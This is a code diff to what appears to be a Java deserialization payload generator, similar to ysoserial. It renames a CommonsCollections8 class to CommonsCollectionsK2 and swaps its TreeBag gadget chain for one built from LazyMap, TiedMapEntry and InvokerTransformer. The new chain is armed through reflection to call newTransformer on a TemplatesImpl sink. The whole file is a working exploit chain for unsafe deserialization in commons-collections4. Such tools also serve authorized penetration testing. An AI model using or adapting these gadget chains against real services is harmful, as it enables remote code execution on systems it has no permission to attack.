@@ -1,4 +1,4 @@
-package com.ppp.chain.collections4;
+package com.ppp.chain.commonscollections4;
 
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
@@ -8,20 +8,23 @@ import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
-import org.apache.commons.collections.bag.TreeBag;
-import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
+
+import java.util.HashMap;
+import java.util.Map;
 
 /**
  * @author Whoopsunix
  */
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
-@Authors({Authors.NAVALORENZO})
+@Authors({Authors.KORLR})
 @Sink({Sink.TemplatesImpl})
-public class CommonsCollections8 implements ObjectPayload<Object> {
+public class CommonsCollectionsK2 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections8.class, args);
+        PayloadRunner.run(CommonsCollectionsK2.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -34,18 +37,16 @@ public class CommonsCollections8 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object templates) throws Exception {
-        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+        HashMap<String, String> innerMap = new HashMap();
+        LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformer);
 
-        // define the comparator used for sorting
-        TransformingComparator comp = new TransformingComparator(transformer);
+        Map<Object, Object> hashMap = new HashMap();
+        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
+        hashMap.put(tied, "t");
+        innerMap.clear();
 
-        // prepare CommonsCollections object entry point
-        TreeBag treeBag = new TreeBag(comp);
-        treeBag.add(templates);
-
-        // arm transformer
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
-
-        return treeBag;
+        return hashMap;
     }
 }
